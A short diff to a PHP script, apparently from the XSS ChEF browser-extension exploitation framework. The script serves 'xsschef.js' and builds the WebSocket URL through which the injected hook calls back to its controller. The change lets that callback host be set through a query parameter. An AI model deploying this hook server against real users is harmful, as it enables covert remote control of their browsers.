@@ -17,8 +17,8 @@
     along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
 $script = file_get_contents('xsschef.js');
-$port = !empty($_GET['p']) ? (int) $_GET['p'] : 8080;
 $server_type = !empty($_GET['t']) ? $_GET['t'] : 'ws';
+$ws_host = !empty($_GET['h']) ? $_GET['h'] : preg_replace('/\:.*/', '', $_SERVER['HTTP_HOST']) . ':8080';
 
 switch ($server_type) {
     case 'xhr':
@@ -26,7 +26,7 @@ switch ($server_type) {
         break;
     case 'ws':
     default:    
-        $url = ($_SERVER['HTTPS'] ? "wss://" : "ws://") . preg_replace('/\:.*/', '', $_SERVER['HTTP_HOST']) . ':' . $port . '/chef'; 
+        $url = ($_SERVER['HTTPS'] ? "wss://" : "ws://") . $ws_host . '/chef'; 
 }
 
 $ch = 'c'.crc32(rand() . time());
